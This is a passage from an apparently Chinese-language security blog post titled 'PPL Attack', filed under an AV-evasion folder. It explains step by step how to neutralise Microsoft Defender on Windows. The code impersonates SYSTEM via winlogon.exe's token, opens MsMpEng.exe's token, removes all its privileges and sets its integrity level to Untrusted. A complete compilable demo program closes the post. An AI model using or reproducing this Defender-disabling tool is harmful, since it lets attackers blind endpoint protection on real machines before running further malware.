<span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面用到的api</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">OpenProcessToken</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE  ProcessHandle,<span class="comment">//打开访问令牌的进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  DWORD   DesiredAccess,</span></span><br><span class="line"><span class="params">  [out] PHANDLE TokenHandle<span class="comment">//返回token的句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>通过获取winlogon.exe这个进程的令牌，调用ImpersonateLoggedOnUser模拟系统用户获取权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span>  procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>;</span><br><span class="line">	<span class="type">int</span> pid = getpid(procname);</span><br><span class="line">	HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);</span><br><span class="line">	HANDLE ptoken;</span><br><span class="line">	OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,</span><br><span class="line">&amp;ptoken);<span class="comment">//拿到winlogon的权限</span></span><br><span class="line">	<span class="keyword">if</span> (ImpersonateLoggedOnUser(ptoken)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">CloseHandle(phandle);<span class="comment">//防止泄漏</span></span><br><span class="line">CloseHandle(ptoken);</span><br></pre></td></tr></table></figure>

<p>在这之后，打开MsMpEng</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LUID sedebugnameValue;</span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = getpid(procname2);</span><br><span class="line">phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);<span class="comment">//也就是这里有补丁，目前貌似在新版win里面打不开这个进程</span></span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的PROCESS_QUERY_LIMITED_INFORMATION对应我们OpenProcessToken需要的权限，不需要多拿</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004203921715.png" alt="image-20241004203921715"></p>
<p>然后就是token的替换</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue);</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(ptoken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to Adjust Token&#x27;s Privileges\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后调用SetPrivilege 将所有Token去掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br></pre></td></tr></table></figure>

<p>SECURITY_MANDATORY_UNTRUSTED_RID 是一个常量，用于表示一个不受信任的安全完整性级别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br></pre></td></tr></table></figure>

<p>然后再将完整性设置为 Untrusted ， Revision 为 SID_REVISION ，表示SID结构的版本号， SubAuthorityCount 为1，表示SID中子权限数组 SubAuthority 的元素数量， IdentifierAuthority.Value[5] 为16，表示用于表示完整性级别的标识符授权， SubAuthority[0] 为 integrityLevel ，表示进程的完整性级别，它是一个整数值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面SID结构的定义</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004204949424.png" alt="image-20241004204949424"></p>
<p>最后创建一个 TOKEN_MANDATORY_LABEL 结构体变量 tokenIntegrityLevel ，表示进程的安全令牌中的强制 完整性级别，然后通过 SetTokenInformation 将完整性设置为 Untrusted</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!SetTokenInformation(</span><br><span class="line">	ptoken,</span><br><span class="line">	TokenIntegrityLevel,</span><br><span class="line">	&amp;tokenIntegrityLevel,</span><br><span class="line">	<span class="keyword">sizeof</span>(TOKEN_MANDATORY_LABEL) + GetLengthSid(&amp;integrityLevelSid)))</span><br></pre></td></tr></table></figure>

<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">EnableDebugPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID sedebugnameValue;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getpid</span><span class="params">(LPCWSTR procname)</span> &#123;</span><br><span class="line">    DWORD procPID = <span class="number">0</span>;</span><br><span class="line">    LPCWSTR processName = <span class="string">L&quot;&quot;</span>;</span><br><span class="line">    PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">    processEntry.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);</span><br><span class="line">    <span class="keyword">if</span> (Process32First(snapshot, &amp;processEntry))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processName, procname) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        Process32Next(snapshot, &amp;processEntry);</span><br><span class="line">        processName = processEntry.szExeFile;</span><br><span class="line">        procPID = processEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Got %ls PID: %d\n&quot;</span>, procname, procPID);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> procPID;</span><br><span class="line">    &#125;</span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hToken, <span class="comment">// access token handle</span></span></span><br><span class="line"><span class="params">LPCTSTR lpszPrivilege, <span class="comment">// name of privilege to enable/disable</span></span></span><br><span class="line"><span class="params">BOOL bEnablePrivilege <span class="comment">// to enable or disable privilege</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID luid;</span><br><span class="line"><span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, <span class="comment">// lookup privilege on local system</span></span><br><span class="line">lpszPrivilege, <span class="comment">// privilege to lookup</span></span><br><span class="line">&amp;luid)) <span class="comment">// receives LUID of privilege</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line"><span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,(PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">LUID sedebugnameValue;</span><br><span class="line">EnableDebugPrivilege();</span><br><span class="line"><span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>;</span><br><span class="line"><span class="type">int</span> pid = getpid(procname);</span><br><span class="line">HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">HANDLE ptoken;</span><br><span class="line">OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,&amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (ImpersonateLoggedOnUser(ptoken)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(phandle);</span><br><span class="line">CloseHandle(ptoken);</span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = getpid(procname2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Bypass Defender...\n&quot;</span>);</span><br><span class="line">phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle:%d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Target Token Handle : %d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue);</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(ptoken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to Adjust Token&#x27;s Privileges\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line">    </span><br><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!SetTokenInformation(ptoken,TokenIntegrityLevel,&amp;tokenIntegrityLevel,<span class="keyword">sizeof</span>(TOKEN_MANDATORY_LABEL) + GetLengthSid(&amp;integrityLevelSid)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(ptoken);</span><br><span class="line">CloseHandle(phandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/PPL%20Attack/" data-id="cm1zwlrfl0007u0v66t1d8lyw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Inline%20Hook/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E7%BC%96%E5%86%99/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>